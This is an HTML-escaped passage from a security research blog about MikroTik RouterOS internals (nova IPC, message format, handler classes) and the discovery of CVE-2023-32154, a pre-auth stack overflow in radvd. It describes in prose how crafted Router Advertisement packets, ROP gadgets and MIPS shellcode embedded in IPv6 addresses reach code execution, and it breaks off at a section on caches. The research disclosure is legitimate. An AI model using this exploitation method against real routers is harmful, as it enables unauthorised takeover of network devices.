&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process returns the result by sending back a nova message
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;If the login succeeds, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; process is spawned, and the user interaction with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; is actually proxied through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc&quot;&gt;IPC&lt;/h3&gt;

&lt;p&gt;The above example simply describes the basic concept of IPC, but the communication between the two processes is actually more complex.&lt;/p&gt;

&lt;p&gt;Every nova message would be sent to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; process through the socket first, then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; dispatches each nova message to the corresponding nova binary.&lt;/p&gt;

&lt;p&gt;Suppose the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process is 1039, the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is 13, and the handler with id 4 in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is responsible for verifying the account and password.&lt;/p&gt;

&lt;p&gt;Firstly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process sends a request with an account and password to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in nova message is an array with two elements &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;13, 4&lt;/code&gt;, which means that the message should be sent to the handler with id 4 in the process with binary id 13.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; receives the message, it will remove the 13 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of the message which represents the target binary id, and add the source binary id in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt;, which is 1039, and then send the message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process does a similar thing when it receives a message: removing the 4 from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; that represents the target handler id and sending the nova message to handler 4 for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message&quot;&gt;Nova Message&lt;/h3&gt;

&lt;p&gt;The nova message used in IPC is initialized and set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; and related functions. Nova message is composed of typed key-value pairs, and the key can only be an integer, so keys such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; are just simple macros.&lt;/p&gt;

&lt;p&gt;The types that can be used in a nova message include u32, u64, bool, string, bytes, IP and nova message (i.e. you can create a nested nova message).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because the RouterOS doesn‚Äôt use nova messages in JSON anymore, we only focus on the binary format of it.&lt;/p&gt;

&lt;p&gt;During IPC communication, the receiver‚Äôs socket receives an integer that expresses the length of the current nova message, followed by the nova message in binary format.
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nova message starts with two magic bytes: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;. Next, each key is described by 4 bytes; the first 3 bytes are used to express the id of the key, and the last byte is the type of the key. Depending on the type, the next bytes will be parsed differently as data, and the next key will come after data, and so on. A special feature is that a bool can be represented by only one bit, so the lowest bit of the type is used to represent True/False. For a more detailed format, see &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;Ôºö
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-x3-format&quot;&gt;The x3 format&lt;/h3&gt;

&lt;p&gt;In order to understand which nova binary the ids in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; in the nova message refer to, we need to parse a file with the extension x3, which is an xml in binary format. By parsing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; with the tool, we can map which nova binary each id corresponds to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The id of some binaries are absent in this file, because some of them have been made available by installing an official RouterOS package. In which case the binary‚Äôs id will exist in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is an example.
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there are still some id of binaries that cannot be found in any .x3 files because these types of processes are not persistent, e.g., the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process, which is only spawned when the user tries to log in and uses a serial number as its id.&lt;/p&gt;

&lt;p&gt;The .x3 file is also used to record nova binary related settings, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; specifies in .x3 which servlet should be used for each URI.
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;After reviewing the research and CVEs from the past, we can see that most vulnerabilities we are interested in have been concentrated in the past, and it seems to be difficult to find  pre-auth vulnerabilities on the WAN side of RouterOS nowadays.&lt;/p&gt;

&lt;p&gt;While vulnerabilities continue to be revealed, the RouterOS is becoming more and more secure. Is it true that there are no more pre-auth vulnerabilities on the RouterOS? Or maybe it‚Äôs just that everyone is missing something?&lt;/p&gt;

&lt;p&gt;Most of the public research mentioned earlier falls into the following three categories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Jailbreaking&lt;/li&gt;
  &lt;li&gt;The analysis of the exploits in the wild&lt;/li&gt;
  &lt;li&gt;The nova message in the IPC&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, after reversing the binary on RouterOS for a while, we realized that the complexity of the whole system was more than that, but no one mentioned the details. This led to the following thought: ‚ÄúNo one with sanity would like to dive into the details of nova binary‚Äù.&lt;/p&gt;

&lt;p&gt;Aside from the exploits leaked from the CIA and APT, most of the research about finding vulnerabilities in RouterOS are: fuzzing network protocols, playing with nova messages, or performing fuzzing tests on nova messages.&lt;/p&gt;

&lt;p&gt;By the outcome, it seems that attackers understand the RouterOS much better than we do, and we need to explore more details about the nova binary to fill in the gaps and increase the possibility to find the vulnerabilities we are looking for. Don‚Äôt get me wrong. I don‚Äôt against fuzzing. But we must ensure we check everything essential to take advantage of the contest.&lt;/p&gt;

&lt;h2 id=&quot;where-to-begin&quot;&gt;Where to begin&lt;/h2&gt;

&lt;p&gt;We don‚Äôt think the RouterOS is flawless, there is a gap between researchers‚Äô and attackers‚Äô understanding of RouterOS. So, what are we missing to find pre-auth RCE on RouterOS?&lt;/p&gt;

&lt;p&gt;The first question that comes to mind is ‚Äúwhere is the entry point of IPC and where does it lead?‚Äù Because most of the functionality triggered by IPC requires login, it is to be expected that sticking to IPC will only lead to more findings in post-auth. IPC is just one part of the main functionality implemented on RouterOS, and we would like to look at the core code of each functionality directly and carefully.&lt;/p&gt;

&lt;p&gt;For example, how do the process that deal with DHCP extract the info needed in a DHCP packet? This information may be stored directly in the process, or may need to be sent to other processes via IPC for further processing.
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-architecture-of-nova-binary&quot;&gt;The Architecture of Nova Binary&lt;/h3&gt;

&lt;p&gt;Hence, we must first understand the architecture of the nova binary. Each nova binary has an instance of the Looper class (or a derivative of it: MultifiberLooper), which is a class for event loop logic. In each iteration, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; to execute the timer that is expired, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check the status of the sockets then process them accordingly.
&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper is responsible for the communication between its nova binary and the loader. Looper first registers a special callback function: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;, which is responsible for dispatching the nova message received from the socket to the corresponding handler in the nova binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-handler-class-and-its-derivatives&quot;&gt;The Handler class and its derivatives&lt;/h3&gt;

&lt;p&gt;When a looper receives a nova message, it will dispatch it to the corresponding handler, e.g., a message with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; will be dispatched by the loader to a nova binary with a binary id of 14. By the time the looper in the binary with a binary id of 14 receives it, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt; left, so the looper will dispatch it to handler 0 for processing. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in the initial nova message is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;, then the looper receives it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;, and the looper handles this message on its own.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let‚Äôs assume that the Looper receives a nova message that should be handled by handler 1 and dispatches it to handler 1. At this point, handler 1 calls the methods &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt; in the vtable of the handler class, which looks for the corresponding function to execute in the vtable based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; specified in the nova message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; in the vtable is often overridden to extend the functionality, but sometimes the developer overrides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt; instead, depending on the developer‚Äôs mood. The handler class is a base class, so  commands related to objects are not implemented.&lt;/p&gt;

&lt;h3 id=&quot;derived-class&quot;&gt;Derived class&lt;/h3&gt;

&lt;p&gt;However, the basic handler class is not the most used one in nova binaries, but rather a derivative of it. Derived classes can be used to store multiple objects of a single type, similar to C++ STL containers.&lt;/p&gt;

&lt;p&gt;For example, when a user creates a DHCP server through the web panel, a nova message with the command ‚Äúadd object‚Äù is sent to handler 0 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process, which then creates a dhcp server object. And the object will be stored in a tree of handler 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The handler 0 here is an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; is a derived class of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt;. Since the command is ‚Äúadd object‚Äù, it triggers the member function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt;, which calls a function at offset 0x7c in handler 0‚Äôs vtable. And that function is actually the constructor of the object contained in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;. For example, if the developer defines handler 0 to be of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt;, then the function at offset 0x7c is the constructor of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The offset of the constructor of the inner object in the vtable is different for each derived class, and locating the constructor to determine what type of objects are contained in the derived class can be done by reversing their individual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function.&lt;/p&gt;

&lt;h3 id=&quot;ipc-and-something-other-than-ipc&quot;&gt;IPC, and something other than IPC&lt;/h3&gt;

&lt;p&gt;Some of the functions in RouterOS are not driven by IPC. Take the two layer 2 discovery protocols, CDP and LLDP, implemented in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; program as an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When starting the two services, handler 0 will be responsible for calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; to open the sockets and register the callback functions for CDP and LLDP.&lt;/li&gt;
  &lt;li&gt;In each iteration of the Looper, call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check if the sockets of CDP and LLDP have received any packets.&lt;/li&gt;
  &lt;li&gt;If packets are received, the corresponding callback function will be called to handle the packets.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What CDP‚Äôs callback does is very simple: it makes sure that the interface that received the packet is allowed, and if it is, it parses the packet and stores the information directly into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; instead of using a nova message, and then returns.
&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It follows that IPC has no ability to trigger any function of CDP or LLDP other than to turn on CDP or LLDP services (which are turned on by default), so it is likely that previous research focused on IPC has not tested the program logic of such implementation.&lt;/p&gt;

&lt;h2 id=&quot;the-story-of-pre-auth-rce&quot;&gt;The Story of Pre-Auth RCE&lt;/h2&gt;

&lt;p&gt;With the knowledge of RouterOS, a surprising accident led us to a long hidden vulnerability.&lt;/p&gt;

&lt;p&gt;One day, when we plugged and unplugged the network cable as usual for reversing and debugging on RouterOS, we found that the log file recorded that the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; had crashed several times! So we tried plugging and unplugging the cable to manually reproduce the crash so that we could use the debugger to locate the problem, but after thousands of plugs and unplugs, we still couldn‚Äôt determine the conditions under which the crash was occurring, and it appeared to be just a random crash.&lt;/p&gt;

&lt;p&gt;After a period of trial and error, we tried to find out where the crash occurred by static reversing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; rather than blindly trying. Though we still couldn‚Äôt find the root cause of the crash in the end, we found another vulnerability in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; after reviewing the core logic in binary with the benefit of our understanding of the nova binary.&lt;/p&gt;

&lt;p&gt;Before describing this vulnerability, let‚Äôs first explain what the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process does.&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;In short, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is a service that handles SLAAC for IPv6.&lt;/p&gt;

&lt;p&gt;In a SLAAC environment, suppose a computer wants to get an IPv6 address to access the Internet, it will first broadcast an RS (Router Solicitation) request to all routers. After the router receives the RS, it will broadcast the network prefix through RA (Router Advertisement); computers receiving the RA can take the network prefix then combine it with the EUI-64 to decide what IPv6 address they‚Äôre going to use for connecting to the Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If an ISP or network administrator wants to assign a network segment to a user, so that the user can assign the address to the user-managed machines. How to assign a segment to the user when only using SLAAC without DHCP? Because SLAAC does not have a way to delegate directly, this is how it usually works:&lt;/p&gt;

&lt;p&gt;Suppose there is an upstream router: Router A, which belongs to an ISP or a network administrator, a user-managed Router B, and a user-managed computer. The ISP or the network administrator will notify the user via email in advance about a /48 network prefix assigned to the user, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt; in this case. Users can set it on Router B, then when the computer sends RS to Router B, Router B will put this prefix into RA for return, this prefix is called routed prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to make Router B be able to communicate with Router A, it also needs to get network prefix from Router A for an IPv6 address of its own. And the network prefix that Router B gets from Router A is called a link prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-execution-flow-of-the-radvd&quot;&gt;The execution flow of the radvd&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;When the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process is started, the socket used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is opened by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; and the corresponding callback function is registered.
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;In each iteration of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radavd&lt;/code&gt;, the socket is checked by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to see if it has received any packets.
&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;If any packets are received, the corresponding callback function will be called to process the packets.
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In the callback function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rardvd&lt;/code&gt;, it will first check if the packet is a legitimate RA or RS, if it‚Äôs RA, store the information, if it‚Äôs RS, start broadcasting RA in LAN.&lt;/p&gt;

&lt;p&gt;There are total three cases in which the RouterOS broadcasts the network prefix:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Received RS from LAN&lt;/li&gt;
  &lt;li&gt;Received RA from WAN&lt;/li&gt;
  &lt;li&gt;Timed broadcast of RA packets on LAN (default random broadcast after 200~600 seconds)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;But we didn‚Äôt find the code that‚Äôs responsible for case 2 in the callback function by statically reversing. At that time we were not sure why, it is actually related to the subscription mechanism in the RouterOS IPC, which we will explain in a later chapter. However, there are two other cases that we can find out directly through static analysis.&lt;/p&gt;

&lt;p&gt;In case 1, when an RS is received from the LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; to broadcast the RA packet:
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case 2, handler 1 will register a timer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;, after initialization:
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; is used to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; at regular intervals to broadcast packets:
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;After digging deeper into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; has a vulnerability in handling DNS advisory. First, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will store the DNS advisory from the RA received from the upstream router (the data structure is a tree), and when it wants to broadcast the RA to the LAN, these DNS will also be wrapped in the RA and broadcast to the LAN.&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; function that expands the tree and puts it into the ICMPv6 packet. In the following figure, the first parameter of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt;, is a buffer of 4096 bytes, which is the final ICMPv6 packet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stepping into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, we can immediately see that there may be a stack buffer overflow here. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; puts DNS into ICMPv6 packets via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; without any boundary check, and as long as the DNS advisory is big enough, it can trigger a stack buffer overflow.
&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The DNS records used here come from the RDNSS field in the RA packet, but according to the RFC, we can find that the field used to describe the length of RDNSS is only 8-bit. It can cover only 255*16 bytes at most, and this length is insufficient for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But if this is not the first time the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; received RA, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; needs to mark the old DNS as expired in the next packet, so we can actually cover twice the length, which is 255*16*2 bytes. That is enough for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;attacking&quot;&gt;Attacking&lt;/h2&gt;

&lt;p&gt;Now, the attacker only needs to send two crafted RA packets with RDNSS field length of 255 to the target RouterOS, and the attacker can control the execution flow of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; program through the IPv6 address in the RDNSS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-protection-of-binaries&quot;&gt;The Protection of Binaries&lt;/h3&gt;

&lt;p&gt;Since the architecture of target RouterOS is MIPS architecture, the CPU doesn‚Äôt support NX, but other protections are also not enabled.&lt;/p&gt;

&lt;p&gt;So it‚Äôs just a matter of finding a good ROP gadget and letting the execution flow eventually jump to the shellcode we place on the stack, easy peasy lemon squeezy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-constraint-of-shellcode&quot;&gt;The Constraint of Shellcode&lt;/h3&gt;

&lt;p&gt;However, there are actually quite a number of limitations in the process of constructing an exploit, for example, since IPv6 addresses are stored in a tree structure, they are sorted before being placed on the stack, so we need to make sure that the payload we build remains the same after sorting.&lt;/p&gt;

&lt;p&gt;The simplest way to do this is to make the IPv6 prefix to be a serial number, which ensures that the contents of our payload are in order, and that we can accurately jump to the shellcode through the ROP gadget. When writing the shellcode, we just need to construct the suffix of each address as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt;, so that we can skip the non-executable  serial number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, due to the delay slot in MIPS, the CPU will actually execute the next instruction of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instruction first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have to move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; forward, but since we can‚Äôt use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; command in the delay slot, the payload will be a pain to construct, and may exceed the length we can use, which is basically a bad idea.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, this is a common beginner level problem in CTF. All we need is to make the prefix of IPv6 address a legal instruction that does not affect the execution result. We change the prefix to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;‚Ä¶‚Ä¶ and so on. In addition to the payloads being sorted, it also saves the space that would otherwise be used for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But since we didn‚Äôt leak the stack address, and since we can‚Äôt find any gadgets available to move the stack address from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; register to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; register, what we‚Äôve done here is to first write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; instruction to memory via a ROP gadget, and then jump to it and execute it with a ROP gadget, which then directs the flow to the shellcode that we‚Äôve constructed, and that sounds pretty good:
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But this is not enough to run shellcode, because MIPS has two different cache for memory access.&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;Cache&lt;/h3&gt;

&lt;p&gt;MIPS has two caches: I-cache (instruction cache) and D-cache (data cache).&lt;/p&gt;

